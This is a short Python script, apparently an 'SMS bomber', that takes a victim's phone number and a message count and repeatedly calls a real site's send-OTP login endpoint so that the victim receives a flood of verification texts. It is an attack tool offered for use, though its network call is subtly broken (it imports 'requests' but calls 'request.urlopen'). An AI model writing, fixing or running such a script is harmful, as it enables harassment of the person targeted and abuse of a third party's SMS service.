import os
import time
import requests
os.system('clear')

print ("""                  
                                                                                     	
                    _     _  _    _    _____   _____   _     _  _____  
 (_)   (_)(_)  (_)  (_____) (_____) (_)   (_)(_____) 
 (_)   (_)(_)__(_)_ (_)  (_)(_)  (_)(_)   (_)(_)__(_)
 (_)   (_)(________)(_)  (_)(_)  (_)(_)   (_)(_____) 
  (_)_(_)      (_)  (_)__(_)(_)__(_)(_)___(_)( ) ( ) 
   (___)       (_)  (_____) (_____)  (_____) (_)  (_)
                                                     
                                                     





*******************************
 Author   :            V4DDUR
 Facebook :          V4DDUR
 GitHub  :             mad420-max
 Version :              1.0
*******************************                                                             
""")

phone  = input("phone number: ")
sms = int(input("amount: "))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "sms send ")
	time.sleep(30)
